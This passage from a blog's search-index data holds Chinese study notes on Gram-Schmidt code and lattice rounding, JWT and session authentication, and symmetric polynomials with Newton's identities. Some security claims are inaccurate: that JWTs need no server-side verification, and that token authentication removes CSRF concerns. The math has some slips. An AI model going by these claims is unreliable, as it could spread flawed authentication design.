hermitian=True)) def perp_to_subspace(vec, basis): components = [project(vec, b) for b in basis] if len(basis) == 0: return vec return vec - reduce(lambda a, b: a + b, components) ret = [] vectors = list(vectors) while len(vectors) \u003e 0 and vectors[0].is_zero_matrix: del vectors[0] for vec in vectors: perp = perp_to_subspace(vec, ret) if not perp.is_zero_matrix: ret.append(Matrix(perp)) if normalize: ret = [vec / vec.norm() for vec in ret] return ret def gram_schmidt_sp(V): # YOUR CODE HERE if type(V) is not sympy.MutableDenseMatrix: raise ValueError if len(V.tolist()) != len(V.tolist()[0]): raise ValueError V = np.array(V) V = np.transpose(V) V = Matrix(V) vlist = V.tolist() tmp_list = [] for i in vlist: tmp_list.append(Matrix(i)) result = my_gramSchmidt_sp(*tmp_list) if len(result) == len(tmp_list): ma_list = [] for i in result: tmp_list = [] for j in i: tmp_list.append(j) tmp = tmp_list ma_list.append(tmp) result = Matrix(ma_list) return result else: ma_list = [] for i in result: tmp_list = [] for j in i: tmp_list.append(j) tmp = tmp_list ma_list.append(tmp) result = Matrix(ma_list) result = Matrix(result).H result = result.row_join(Matrix([[0], [0]])) return result Sagemath: # 定义向量组 v1 = vector([1, 0, 1]) v2 = vector([1, 1, 1]) v3 = vector([0, 1, 1]) vec_list = [v1, v2, v3] # 使用 Gram-Schmidt 函数进行正交化 orth_list = GramSchmidt(vec_list) # 输出正交向量组 for v in orth_list: print(v) #在上面的代码中，我们首先定义了一个向量组，然后使用GramSchmidt函数将其转换为正交向量组。最后，我们遍历正交向量组并将其打印出来。 #需要注意的是，Gram-Schmidt函数只能在有限维向量空间上工作。如果您需要处理无限维向量空间，则需要使用其他方法。 ","date":"2024-04-04","objectID":"/lattice-part-0/:9:2","tags":[],"title":"Lattice Part 0","uri":"/lattice-part-0/"},{"categories":[],"content":"3.2 Lattice Rounding （取整问题） 原基向量再正交化后得到新的基向量，但是同时也产生了新的不同于原来的格。 平移：t，约束条件： 在基于Lattice的信息传输中，使用了取整，蕴含了一个不等式： 取整求解的问题： 当我们做取整操作的时候，因为几何形状的原因，最后的得到的结果格点和CVP问题的真正解会略有误差。比如我们看上图，t的落点在内圈的这个小圆内，那么我们取整得到的一定会是CVP的正确解。 正确解的条件： 上面的表述避免了使用各种不同范数的概念，可根据三维欧几里得空间辅助理解。 下图可辅助理解。 References 稀有气体：斯坦福的经验交流 CTFwiki Wikipedia 【非线性优化理论】凸集 Lattice Reduction Attacks on RSA A systematic approach to lattice models with solvable boundary states of arbitrary codimension An Introduction to Lenstra-Lenstra-Lovasz Lattice Basis Reduction Algorithm ","date":"2024-04-04","objectID":"/lattice-part-0/:10:0","tags":[],"title":"Lattice Part 0","uri":"/lattice-part-0/"},{"categories":[],"content":"Jwt json web token 跨域认证的问题 跨域认证指的是在不同域名下的应用程序之间进行身份验证和授权的过程。由于浏览器的同源策略，不同域名下的应用程序不能直接访问对方的信息，因此在进行跨域认证时需要使用特定的技术手段来实现。 浏览器的同源策略（Same Origin Policy）是一种安全机制，用于限制一个源（域名、协议和端口号的组合）的文档或脚本如何与其他源的资源进行交互。同源策略的目的是防止恶意网站通过脚本等方式获取用户的敏感信息或进行恶意操作。 同源策略的限制包括以下几个方面： Cookie、LocalStorage和IndexDB等存储机制的限制：同源的文档可以共享这些存储机制，但不同源的文档无法访问彼此的存储数据。 DOM操作的限制：同源的文档可以通过JavaScript等脚本访问彼此的DOM元素，但不同源的文档无法访问彼此的DOM元素。 AJAX请求的限制：同源的文档可以通过XMLHttpRequest等方式进行AJAX请求，但不同源的文档无法进行跨域AJAX请求。 需要注意的是，同源策略只限制浏览器端的交互，服务器端不存在同源策略的限制。如果需要进行跨域交互，可以使用一些特殊的技术手段，如JSONP、CORS、代理服务器等。 ","date":"2024-04-04","objectID":"/jwt-note/:0:0","tags":[],"title":"Jwt Note","uri":"/jwt-note/"},{"categories":[],"content":"常用的跨域认证技术 CORS（跨域资源共享）：CORS是一种浏览器技术，通过在服务器端设置响应头信息，允许跨域的请求进行访问。在进行跨域认证时，可以在服务器端设置CORS响应头，允许来自其他域名的请求访问。 JSONP（跨域JSON请求）：JSONP是一种利用script标签进行跨域请求的技术，它通过在请求中添加一个回调函数名参数，让服务器将数据包装成一个函数调用返回给客户端，从而实现跨域请求。 代理服务器：代理服务器是一种在服务器端进行跨域请求的技术，它通过在服务器端设置代理服务器，将跨域请求转发到目标服务器上进行处理，再将结果返回给客户端。 OAuth2.0：OAuth2.0是一种开放标准，用于授权第三方应用程序访问用户资源的过程。在进行跨域认证时，可以使用OAuth2.0协议来进行身份验证和授权，让第三方应用程序获得访问用户资源的权限。 ","date":"2024-04-04","objectID":"/jwt-note/:1:0","tags":[],"title":"Jwt Note","uri":"/jwt-note/"},{"categories":[],"content":"session 和 jwt Session模式和JWT模式都是常见的身份验证和授权机制，二者有以下几点不同： 存储方式不同：Session模式将用户身份信息存储在服务端的内存或者数据库中，而JWT模式将用户身份信息存储在客户端的浏览器中。 状态管理方式不同：Session模式需要服务端在每次请求中校验用户的身份信息，而JWT模式则不需要服务端校验，只需要在客户端解密和校验即可。 扩展性不同：Session模式需要在服务端存储用户身份信息，因此需要考虑存储容量和扩展性等问题，而JWT模式不需要存储用户身份信息，因此具有更好的扩展性。 跨语言支持不同：Session模式需要服务端和客户端使用相同的编程语言实现，而JWT模式可以跨越多种编程语言和平台。 安全性不同：Session模式存在一定的安全风险，如会话劫持、会话固定等问题，而JWT模式可以通过加密和签名等方式提高安全性。 总的来说，Session模式适用于单一的应用程序，而JWT模式适用于多个应用程序或者服务之间的信息传输。 Token 的使用 用户信息加密填入 token 中，服务器不保存任何用户信息，保存密钥信息，通过使用特定加密算法验证 token。 client – uid+passwd 请求 sever – 收到并验证 sever – 验证成功后签发 token 并将 token 返回客户端 client – 请求服务器资源需要附带 token （在 cookie 或 header 中携带） sever – 收到请求核验 token，成功则返回所请求数据 基于token的认证方式相对于session认证方式更加节约服务器资源，对移动端和分布式更友好。 支持跨域访问。token不使用cookie而直接放入请求头中，跨域后不存储信息丢失。 无状态：token机制在服务端不储存session信息，token自身携带登录用户的信息。 更加适用CDN: 可以通过分发网络请求服务端的所有资料。 更适用于移动端：当客户端时非浏览器平台时，cookie不被支持，而token可以实现。 无需考虑CSRF: 由于不再依赖cookie,token认证不会发生CSRF无需考虑CSRF的防御。 CRSF（Cross-Site Request Forgery）是一种网络攻击方式，攻击者通过伪造用户已经授权过的请求来执行恶意操作。攻击者通常会通过诱骗用户点击链接或访问网站来实现攻击。CRSF攻击可以导致用户的账户被盗、信息泄露等安全问题。 CDN（Content Delivery Network）是一种分布式网络架构，通过在全球各地部署服务器节点，将静态资源（如图片、视频、脚本等）缓存在离用户最近的服务器上，从而提高资源访问速度和用户体验。CDN的主要功能包括：加速访问速度、提高网站可用性、降低服务器负载、保障安全性等。通过使用CDN，网站可以更快地响应用户请求，减少带宽消耗和服务器压力，提高网站的稳定性和安全性。 Json Web Token JWT的本质是一个字符串。它将用户信息保存到一个Json字符串中，然后进行编码后得到一个JWT token，并且这个JWT token带有签名信息，接收后可以校验是否被篡改，所以可以用于在各方之间安全地将信息作为Json对象传输。 JWT的认证流程如下： Session Session 的抽象概念是会话，是无状态协议通信过程中，为了实现中断/继续操作，将用户和服务器之间的交互进行的一种抽象；具体来说，是服务器生成的一种 Session 结构，可以通过多种方式保存，如内存、数据库、文件等，大型网站一般有专门的 Session 服务器集群来保存用户会话。 session 是另一种记录服务器和客户端会话的机制。 session 是基于cookie 实现的，session 存储在服务器端，session ID 会被 cookie 保存到客户端的 cookie 中。 服务器执行 session 机制时，生成 session ID 发送客户端，客户端请求将 ID 加入 http 发送服务端，ID 本地保存，容器为 cookie，因此 ban 掉 cookie 时，session 不能正确使用。 session ID 在服务端 进行匹配。 cookie 客户端保存用户信息的一种机制，用来记录用户信息。服务器存储在本地机器上的一小段文本，会被下一次请求携带发往服务器。 cookie 不可跨越，每个 cookie 绑定单一域名，无法在别的域名下使用，一级域名和二级域名互通，（凭借 domain） cookie 会根据上 http 响应报文中的的 set-cookie 的首部字段信息，通知客户端保存 cookie。当下客户端再向服务端发起请求时，cookie 自动加入。 属性：Http协议是一种无状态的协议 http 无状态的协议 （对于事务处理无记忆功能，对话完成后，服务端不保存任何会话信息。） 每一个 http 完全独立 服务端无法 确认当前访问者的身份信息，无法分辨上一次的请求发送者和这一次的是否相同。下一次请求时，仍然需要认证。为了解决这个问题，提出了cookie的解决方案： Session的一些问题 每个用户的登录信息都会保存到服务器的session中，随着用户的增多，服务器开销会明显增大 由于session是存在与服务器的物理内存中，所以在分布式系统中，这种方式将会失效。虽然可以将session统一保存到Redis中，但是这样做无疑增加了系统的复杂性，对于不需要redis的应用也会白白多引入一个缓存中间件 无cookie时失效，例如非浏览器的移动端、手机移动端等等。 cookie截获导致的CSRF 中间件的存在导致消息可能转发多次 后端部署复杂 由于cookie的不可跨域性，session的认证也无法跨域，不适用于单点登录（SSO） 单点登录（Single Sign-On，简称SSO）是一种身份认证机制，允许用户使用一组凭据（如用户名和密码）登录到多个应用程序或系统中，而无需为每个应用程序单独进行身份验证。在SSO中，用户只需进行一次登录，就可以访问多个应用程序，从而提高用户体验和工作效率。SSO通常使用集中式认证服务来管理用户身份信息和授权访问权限，例如OAuth、OpenID Connect等。SSO的优势包括降低密码管理成本、提高安全性、增强用户体验等。 跨域认证（Cross-Origin Authentication）是指在不同域之间进行身份认证的过程。由于同源策略的限制，不同域之间的页面无法直接访问彼此的Cookie信息，因此跨域认证需要使用特殊的技术手段来实现。常见的跨域认证方式包括OAuth、OpenID Connect等。OAuth是一种基于令牌的授权机制，允许用户授权第三方应用程序访问其资源，而无需将用户名和密码直接提供给第三方应用程序。OpenID Connect是基于OAuth 2.0的身份验证协议，提供了一种标准化的方式来验证用户身份和授权访问权限。通过使用这些跨域认证技术，应用程序可以安全地进行跨域身份认证，提高用户体验和安全性。 Jwt认证的一些优势 数据量小，传输迅速 Json加密形式保存在客户端，可跨语言，原则上支持各种web形式。 无需在服务器保存会话信息。 适用于分布式、移动端 SSO友好 故常见的分布式应用和单点式应用更加适合JWT。 Zero Turst 传统的Session和JWT权限管理方式都是基于令牌的方式，而零信任权限管理则更加注重身份验证和访问控制。在零信任模型中，每个用户和设备都需要进行身份验证，并且需要对其进行访问控制，以确保只有经过授权的用户和设备可以访问受保护的资源。与传统的Session和JWT相比，零信任权限管理更加安全和可靠，因为它采用了多层次的安全防护措施，包括身份验证、访问控制、数据加密等。同时，零信任权限管理还可以实现更细粒度的访问控制，以确保每个用户和设备只能访问其需要的资源，从而提高了系统的安全性和可靠性。 Jwt的结构 JWT由三部分构成：Header+Payload+Signature. 传输时，各部分分别base64编码后以.连接，形成最终传输字符串。 每部分对应作用： header和payload可以可解码出原文，获得哈希签名和有效数据。此处有效数据可以另行加密。 signature使用散列函数，无法解码，用于校验token是否有所修改： 校验过程： header中获取加密算法，利用算法加上SecretKey对header、payload进行加密，比对加密后的数据和客户端发送来的是否一致。主一般对于md5系列，SecretKey代表盐值。 ","date":"2024-04-04","objectID":"/jwt-note/:2:0","tags":[],"title":"Jwt Note","uri":"/jwt-note/"},{"categories":[],"content":"Header { \"alg\": \"HS256\", \"typ\": \"JWT\" } alg即algorithm，默认HS256（HMAC SHA256) typ即这个token的type，jwt类型写为 “JWT” ","date":"2024-04-04","objectID":"/jwt-note/:3:0","tags":[],"title":"Jwt Note","uri":"/jwt-note/"},{"categories":[],"content":"Payload 官方给出七个字段： iss (issuer)：签发人 exp (expiration time)：过期时间 sub (subject)：主题 aud (audience)：受众 nbf (Not Before)：生效时间 iat (Issued At)：签发时间 jti (JWT ID)：编号 也可自定义私有字段 { \"sub\": \"Test Text\", \"name\": \"HaLois\", \"admin\": true } 注意，JWT 默认是不加密的 ","date":"2024-04-04","objectID":"/jwt-note/:4:0","tags":[],"title":"Jwt Note","uri":"/jwt-note/"},{"categories":[],"content":"Signature Signature 部分是对前两部分的签名，防止数据篡改。 首先，需要指定一个密钥（secret）。这个密钥只有服务器才知道，不能泄露给用户。然后，使用 Header 里面指定的签名算法（默认是 HMAC SHA256） 算出签名以后，把 Header、Payload、Signature 三个部分拼成一个字符串，每个部分之间用\"点\"（.）分隔，就可以返回给用户。 Jwt的分类 nosecure JWT:未经signature，不安全。 JWS:经过签名。 JWE:payload部分经过加密。 ","date":"2024-04-04","objectID":"/jwt-note/:5:0","tags":[],"title":"Jwt Note","uri":"/jwt-note/"},{"categories":[],"content":"Nosecure Jwt header部分无指定签名算法。 { \"alg\": \"none\", \"typ\": \"JWT\" } ","date":"2024-04-04","objectID":"/jwt-note/:6:0","tags":[],"title":"Jwt Note","uri":"/jwt-note/"},{"categories":[],"content":"Jws JWT Signature,结构为 Nosecure Jwt基础上增加头部算法声明，并在最后添加签名。 完成签名需要的SecretKey: 对称加密：可用于生成签名于验证签名。 非堆成加密：SecretKey指私钥，只能用于生成签名，公钥用于验证签名。 JWT的密钥或密钥对统称为JSON Web Key JWT签名算法： HMAC 【哈希消息验证码（对称）】：HS256/HS384/HS512 RSASSA【RSA签名算法（非对称）】：RS256/RS384/RS512 ECDSA 【ECC签名算法（非对称）】：ES256/ES384/ES512 在实际开发中需要用下列手段来增加JWT的安全性： JWT在请求头中传递的，故为避免网络劫持，推荐使用HTTPS来传输，更加安全 JWT的哈希签名的密钥是存放在服务端的，所以只要服务器不被攻破，理论上JWT是安全的。因此要保证服务器的安全 JWT可以使用暴力穷举来破解，所以为了应对这种破解方式，哈希签名密钥(盐值)需要添加生命周期。 Jwt的特点 JWT 默认是不加密，但也是可以加密的。生成原始 Token 以后，可以用密钥再加密一次。 JWT 不加密的情况下，不能将秘密数据写入 JWT。 JWT 不仅可以用于认证，也可以用于交换信息。有效使用 JWT，可以降低服务器查询数据库的次数。 JWT 的最大缺点是，由于服务器不保存 session 状态，因此无法在使用过程中废止某个 token，或者更改 token 的权限。也就是说，一旦 JWT 签发了，在到期之前就会始终有效，除非服务器部署额外的逻辑。 JWT 本身包含了认证信息，一旦泄露，任何人都可以获得该令牌的所有权限。为了减少盗用，JWT 的有效期应该设置得比较短。对于一些比较重要的权限，使用时应该再次对用户进行认证。 为了减少盗用，JWT 不应该使用 HTTP 协议明码传输，要使用 HTTPS 协议传输。 References 阮一峰の博客 官方文档 零信任安全框架-奇安信 IBM的介绍 How2Use ","date":"2024-04-04","objectID":"/jwt-note/:7:0","tags":[],"title":"Jwt Note","uri":"/jwt-note/"},{"categories":[],"content":"任何一个一元复系数多项式方程都至少有一个复数根。也就是说，复数域是代数封闭的 复数域代数封闭。 代数封闭：域$F$被称为代数闭域，当且仅当任何系数属于$F$且次数大于零的单变量多项式在$F$里至少有一个根。代数闭域一定是无限域。 不得不感慨,还是需要捡起一些遗忘的科目:)，回忆下笔者和Galois理论的缘起。 对称多项式基本定理 ","date":"2024-04-04","objectID":"/%E6%A0%B9%E4%B8%8E%E5%A4%9A%E9%A1%B9%E5%BC%8F%E7%B3%BB%E6%95%B0%E5%85%B3%E7%B3%BB/:0:0","tags":[],"title":"根与多项式系数关系","uri":"/%E6%A0%B9%E4%B8%8E%E5%A4%9A%E9%A1%B9%E5%BC%8F%E7%B3%BB%E6%95%B0%E5%85%B3%E7%B3%BB/"},{"categories":[],"content":"对称多项式 对称多项式： 对于域$F$上的$n$元多项式$f(x_{1},x_{2},x_{3},\\dots,x_{n})\\in F[x_{1},x_{2},\\dots,x_{n}]$,如果对于任意两个变量对换，原多项式保持不变，则这个多项式称为对称多项式。 等价定义： $$ \\forall σ \\in \\mathbb{S_n}, f(x_{σ(1)},x_{σ(2)},\\dots,x_{σ(n)})=f(x_{1},x_{2},\\dots,x_{n}) $$ 由此可以推出： 对于多项式 $f(x_{1},\\dots,x_{n})$ 中的 $m$ 次项 $$ \\prod_{k=0}^{m} x_{i_{k}}^{j_{k}} $$ 在置换后成为 $\\prod_{k=0}^{m} x_{σ(i_{k})}^{j_{k}}$ 依然是 $f(x_{1},\\dots,x_{n})$ 中的一项；故在所有置换下，得到所有项构成一个 $m$ 次齐次多项式： $$ \\sum_{σ \\in \\mathbb{Sn}} \\prod_{k=0}^{m} x_{σ(i_{k})}^{j_{k}} $$ 任何一个单项式都可以置换产生一个齐次多项式。 例： 最简单的但现实每个变量次数不超过$1$： $$ σ_{1} = \\underset{1\\le i \\le n}{\\sum} x_{i} = x_{1}+x_{2}+x_{3}+\\dots+x_{n} $$ 例： 二次式$x_{1}x_{2}$经过置换可以得到二次齐次对称多项式： $$σ_{2} = \\underset{1\\le i \\le j \\le n}{\\sum}x_{i}x_{j} = x_{1}x_{2}+x_{1}x_{3}+x_{1}x_{n}+x_{2}x_{3}+\\dots+x_{n-1}x_{n} $$ 例： 三次情况： $$ σ_{3}= \\underset{1\\le i \\le j \\le k \\le n}{\\sum } x_{i}x_{j}x_{k} $$ 一般的，对于k次多项式： $$ σ_{k}= \\underset{1\\le i_{1} \\le i_{2} \\dots i_{n-1}\\le i_{n} \\le n}{\\sum} x_{i_{1}}x_{i_{2}}\\dots x_{i_{k}} $$ 基本对称多项式 特别地，对于$n$次式 $x_{1}x_{2}\\dots x_{n}$ 本身就是一个$n$次齐次对称多项式$σ_{n}$。 ","date":"2024-04-04","objectID":"/%E6%A0%B9%E4%B8%8E%E5%A4%9A%E9%A1%B9%E5%BC%8F%E7%B3%BB%E6%95%B0%E5%85%B3%E7%B3%BB/:1:0","tags":[],"title":"根与多项式系数关系","uri":"/%E6%A0%B9%E4%B8%8E%E5%A4%9A%E9%A1%B9%E5%BC%8F%E7%B3%BB%E6%95%B0%E5%85%B3%E7%B3%BB/"},{"categories":[],"content":"推论 根据代数基本定理，在一个代数封闭域$F$上的$n$次首一多项式 $$ f'(x) = x^{n} + \\sum_{i=1}^{n} a_{i}x^{n-i} $$ 都有$n$个零点，可分解为 $$f'(x)= \\prod_{i=1}^{k}(x-x_{i}) $$ 展开后得到： 首一多项式的韦达定理 $$ f'(x)=x^{n}-σ_{1}x^{n-1}+σ_{2}x^{n-2}+\\dots+(-1)^kσ_{k}x^{n-k}+(-1)^nσ_{n} $$ 对应相等得到根与系数关系： $$ σ_{k} = (-1)^{k} a_{k}, 1\\le k \\le n $$ 一般的韦达定理 定义 $$ f(x) = \\sum_{i=0}^{n} a_{i} x^{n-i} $$ 注意到上述特殊 $ f'(x) $ 为 $ F(x) $ 的 $ a_{0}=1 $ 的特殊情况， 所有系数均除以 $ f(x) $ 的 $ a_{0} $ ,现在重新定义域 $ F $ 上一般多项式的韦达定理。 一般的加入最高次项系数： $$ \\sigma_k^{\\prime}=(-1)^k\\frac{a_k}{a_0},1\\leq k\\leq n $$ 由此完成上述概念阐发的韦达定理内容。 ","date":"2024-04-04","objectID":"/%E6%A0%B9%E4%B8%8E%E5%A4%9A%E9%A1%B9%E5%BC%8F%E7%B3%BB%E6%95%B0%E5%85%B3%E7%B3%BB/:2:0","tags":[],"title":"根与多项式系数关系","uri":"/%E6%A0%B9%E4%B8%8E%E5%A4%9A%E9%A1%B9%E5%BC%8F%E7%B3%BB%E6%95%B0%E5%85%B3%E7%B3%BB/"},{"categories":[],"content":"基本多项式定理 对于任意域$F$上的多项式$f\\in F(x_{1},x_{2},\\dots,x_{n})$, 都存在多项式 $g \\in F[x_{1},x_{2},\\dots,x_{n}]$使得$f=g(σ_{1},σ_{2},\\dots,σ_{n})$ 这一定理说明了基本多项式与原始多项式可相互表出。 ","date":"2024-04-04","objectID":"/%E6%A0%B9%E4%B8%8E%E5%A4%9A%E9%A1%B9%E5%BC%8F%E7%B3%BB%E6%95%B0%E5%85%B3%E7%B3%BB/:3:0","tags":[],"title":"根与多项式系数关系","uri":"/%E6%A0%B9%E4%B8%8E%E5%A4%9A%E9%A1%B9%E5%BC%8F%E7%B3%BB%E6%95%B0%E5%85%B3%E7%B3%BB/"},{"categories":[],"content":"基本对称多项式定理的证明 对于变量个数$n$进行归纳： $n=1$时，结论成立。 假设$n-1$个变量时，结论成立，对于n个变量，结论也成立 $$σ_{k}= \\sum_{1\\le i_{1} \\le \\dots \\le i_{k} \\le n} x_{i_{1}x_{i_{2}}}\\dots x_{i_{k}}$$ $σ_{k}$为n元基本对称多项式。 $$\\tau_{k}= \\sum_{1\\le i_{1} \\le \\dots \\le i_{k} \\le n} x_{i_{1}x_{i_{2}}}\\dots x_{i_{k}}$$ $\\tau_{k}$为$n-1$元基本多项式。 对于 $$σ_{1}= \\tau_{1}+x_{n},\\tau_{1}=σ_{1}-x_{n}$$ $$σ_{2} = \\tau_{2} +\\tau_{1}x_{n},\\tau_{2}=σ_{2}-x_{n}σ_{1}+x_{n}^2$$ $$σ_{3}=\\tau_{3}+\\tau_{2}x_{n},\\tau_{3}=σ_{3}-σ_{2}x_{n}+\\tau_{1}x_{n}^2-x_{n}^3$$ $$\\dots$$ $$σ_{n-1}=\\tau_{n-1}+\\tau_{n-2}x_{n}$$ $$σ_{n}=\\tau_{n-1}x_{n},0=σ_{n}-σ_{n-1}x_{n}+\\dots+(-1)^{n}σ_{1}x^{n-1}+(-1)^{n+1}x^n_{n}$$ 所以对于是任意$n$元多项式$f\\in F(x_{1},\\dots,x_{n})$,可以写成 $$f= g_{n-1}x_{n}^{n-1}+\\dots+g_{1}x_{1}+g_{0} = \\sum_{i=0}^{n-1}g_{i}x^{i_{n}},g_{k}\\in F(x_{1},x_{2},\\dots,x_{n-1})$$ 注意到$f$为$n$元对称多项式，可得$f$在$x_{1},x_{2},\\dots,x_{n-1}$的任意置换下不变。由此可得，$g_{k}$是$n-1$元对称多项式。 由归纳假设可得，$g_{k}$可由$\\tau_{1},\\tau_{2}\\dots \\tau_{n-1}$表出，即有： $$ g_k=g_k(\\tau_1,\\tau_2,\\cdots, \\tau_{n-1}),~0\\leq k\\leq n. $$ 又$\\tau_{k}$可用$σ_{1},σ_{2},\\dots,σ_{n-1}$表出，代入： $$f=f_{n-1}x_n^{n-1}+\\cdots+f_1x_n+f_0$$ 其中 $f_k=f_k(σ_1,σ_2,\\cdots,σ_n)$ 是 n 元对称多项式。 为了证明 $f$ 可以用 $σ_1,σ_2,\\cdots, σ_n$ 多项式表示，只需要证明 $f_k=0,~1\\leq k\\leq n-1$ ，由此得到 $f=f_0$ . 把 $x_i$ 和 $x_n$ 对换得到 $f=f_{n-1}x_i^{n-1}+f_{n-2}x_i^{n-2}+\\cdots+f_1x_i+f_0,~ 1\\leq i\\leq n.$ 矩阵形式可表示为范德蒙矩阵系数形式： $$ \\begin{pmatrix} 1\u0026x_1\u0026x_1^2\u0026\\cdots\u0026 x_1^{n-1}\\\\ 1\u0026x_2\u0026x_2^2\u0026\\cdots\u0026 x_2^{n-1}\\\\ \\vdots\u0026\\vdots\u0026\\vdots\u0026\\cdots\u0026\\vdots\\\\ 1\u0026x_n\u0026x_n^2\u0026\\cdots\u0026 x_n^{n-1} \\end{pmatrix} \\begin{pmatrix} f_0\\\\ f_1\\\\ \\vdots\\\\ f_{n-1} \\end{pmatrix}= \\begin{pmatrix} f\\\\ f\\\\ \\vdots\\\\ f \\end{pmatrix} $$ 注意到解的唯一性，以及特解$f_{1}=f_{2}=\\dots=f_{n-1}=0,f_{0}=f$为特解，可得$f=f_{0}$ ","date":"2024-04-04","objectID":"/%E6%A0%B9%E4%B8%8E%E5%A4%9A%E9%A1%B9%E5%BC%8F%E7%B3%BB%E6%95%B0%E5%85%B3%E7%B3%BB/:3:1","tags":[],"title":"根与多项式系数关系","uri":"/%E6%A0%B9%E4%B8%8E%E5%A4%9A%E9%A1%B9%E5%BC%8F%E7%B3%BB%E6%95%B0%E5%85%B3%E7%B3%BB/"},{"categories":[],"content":"经典表出 对于三次情况： 牛顿恒等式 特殊的对称多项式： $$ S_{k} = σ_{i=1}^{n} x_{i}^{k} = x_{1}^k+x_{2}^k,+x_{3}^k+\\dots+x_{n}^k,k=0,1,\\dots $$ 牛顿恒等式 设 $x_1,x_2,\\ldots,x_n$ 是 $a_nx^n+a_{n-1}x^{n-1}+\\cdots+a_1x+a_0=0$ 的 n 个根，定义 $$\\begin{aligned} e_{0} \u0026=1 \\\\ e_{1} \u0026=x_{1}+x_{2}+\\cdots+x_{n} \\\\ e_{2} \u0026=\\sum_{1 \\leq i\u003cj \\leq n} x_{i} x_{j}=x_{1} x_{2}+x_{1} x_{3}+\\cdots+x_{n-1} x_{n} \\\\ \u0026 \\vdots \\\\ e_{n} \u0026=x_{1} x_{2} \\cdots x_{n} \\\\ e_{k} \u0026=0, \\quad \\text { for } k\u003en \\end{aligned}$$ 根据韦达定理可知： $$e_{1}=-\\frac{a_{n-1}}{a_{n}}, e_{2}=\\frac{a_{n-2}}{a_{n}}, \\ldots, e_{n}=(-1)^{n} \\frac{a_{0}}{a_{n}} . $$ 定义 $$p_{k}=x_{1}^{k}+\\cdots+x_{n}^{k},k\\in{1,2,3\\ldots}$$ 有了对称多项式的概念和基本定理，不难理解牛顿恒等式的推导。 也注意到这里 $$\\begin{aligned} e_{0} \u0026=σ_{0} \\\\ e_{1} \u0026=σ_{1} \\\\ e_{2} \u0026= σ_{2} \\\\ \u0026 \\vdots \\\\ e_{n} \u0026=σ_{n} \\\\ e_{k} \u0026=0, \\quad \\text { for } k\u003en \\end{aligned}$$ 韦达定理可知： $$e_{i} = (-1)^{n} \\frac{a_{n-i}}{a_{n}}$$ 基本定理可得 $$p_k=\\begin{cases}\u0026e_1p_{k-1}-e_2p_{k-2}+\\cdots+(-1)^{k-2}e_{k-1}p_1+(-1)^{k-1}ke_k \u0026k\\leq n \\\\ \u0026e_1p_{k-1}-e_2p_{k-2}+\\cdots+(-1)^{n-1}e_np_{k-n} \u0026k\u003en\\end{cases}$$ 利用递归计算$p_{k}$ $$P_i=e_iP_{i-1}-e_2P_{i-2}+\\cdots+(-1)^{k+1}e_kP_{i-k}$$ 高联科目一 Let $r_{1},r_{2},r_{3},r_{4},r_{5}$ be roots of $x^5+5x^4+10x^3+10x^2+6x+3$ Compute $$ (r_{1}+5)^5+(r_{2}+5)^5+(r_{3}+5)^5+(r_{4}+5)^5+(r_{5}+5)^5 $$ 写出$f(x+5)$并化简，然后得到系数，代入恒等式即可。 不过可以有更多小Trick :) $$f(x+5) = p_{5}+25p_{4}+250p_{3}+1250p_{2}+3125p_{1}+3125 \\times 5$$ $p_{i}$的计算过程: $$\\begin{aligned} p_1\u0026=e_1p_0=-5 \\\\ p_2\u0026=e_1p_1-2e_2=(-5)^2-2\\cdot10=5 \\\\ p_3\u0026=e_1p_2-e_2p_1+3e_3=(-5)\\cdot5-10\\cdot(-5)+3\\cdot(-10)=-5 \\\\ p_4\u0026=e_1p_3-e_2p_2+e_3p_1-4e_4=1 \\\\ p_5\u0026=e_1p_4-e_2p_3+e_3p_2-e_4p_1+5e_5=10\\\\ \\end{aligned}$$ Trick: $x^5+5x^4+10x^3+10x^2+6x+3=(x+1)^5+(x+1)+1$ 令 $r_i=s_i+1,i\\in{1,2,3,4,5}$ $\\sum_{i=1}^5(s_i+5)^5=\\sum_{i=1}^5(r_i+4)^5$ 其中， $r_i,i\\in{1,2,3,4,5}$ 是方程 $x^5+x+1=0$ 的5个根. $e_1=e_2=e_3=0,e_4=1,e_5=-1$ $p_1=p_2=p_3=0,p_4=-4,p_5=-5$ $p_5+20p_4+0+0+0+4^5\\cdot5=\\boxed{5035}.\\square$ 科目二 对于多项式$f(x) = \\sum_{i=0}^{n} a_{i}x^{n-i}$,已知条件如下,请将$a_{i}$写成以$a,b,c$标出的形式。 $$ \\begin{aligned} a =x_{1}+x_{2}+x_{3} \\\\ b = x_{1}^{2}+x_{2}^{2}+x_{3}^{2} \u0026= (x_{1}+x_{2}+x_{3})^{2}- 2(x_{1}x_{2} + x_{2}x_{3} + x_{3}x_{1} ) \\\\ c = x_{1}^{3} + x_{2}^{3} +x_{3}^{3} \u0026= (x_{1} +x_{2} + x_{3})^{3} - 3(x_{1}x_{2} +x_{2}x_{3} +x_{3}x_{1})(x_{1} +x_{2} +x_{3} ) + 3x_{1}x_{2}x_{3} \\\\ \\end{aligned}$$ $$ \\begin{aligned} \u0026\\sigma_{1} =x_1+x_2+x_3=a \\\\ \u0026σ_2 =x_1x_2+x_2x_3+x_3x_1=\\frac{a^2-b}2 \\\\ \u0026σ_3 =x_1x_2x_3=\\frac{\\left(c+3a\\frac{a^2-b}2-a^3\\right)}3 \\end{aligned} $$ 根据上面得学习： $$ σ_{k}= (-1)^{k}a_{k},1\\le k \\le n $$ 即 $$ \\begin{aligned} \u0026\\sigma_{1} =x_1+x_2+x_3=a \\\\ \u0026σ_2 =x_1x_2+x_2x_3+x_3x_1=\\frac{a^2-b}2 \\\\ \u0026σ_3 =x_1x_2x_3=\\frac{\\left(c+3a\\frac{a^2-b}2-a^3\\right)}3 \\end{aligned} $$ 假设所求多项式$f(x)$的对应首一多项式为$f'(x)$，那么可得其对称多项式表出$g'(x)$ $$g'(x)= x^{3} - ax^{2} + \\left( \\frac{a^{2}-b}{2} \\right)x - \\frac{\\left( c+ 3a \\frac{a^{2}-b}{2}-a^3 \\right)}{3}$$ 注意到定义多项式系数$a_{i}$定义在$\\mathbb{Z}^+$上，故还原其中一个多项式为： $$f(x)=-6x_{1}^2+6ax_{1}^2+(-3a^2+3b)x_{1}+a^3-3ab+2c$$ 一元三次方程求根公式 ","date":"2024-04-04","objectID":"/%E6%A0%B9%E4%B8%8E%E5%A4%9A%E9%A1%B9%E5%BC%8F%E7%B3%BB%E6%95%B0%E5%85%B3%E7%B3%BB/:3:2","tags":[],"title":"根与多项式系数关系","uri":"/%E6%A0%B9%E4%B8%8E%E5%A4%9A%E9%A1%B9%E5%BC%8F%E7%B3%BB%E6%95%B0%E5%85%B3%E7%B3%BB/"},{"categories":[],"content":"历史的进程 Scipione del Ferro 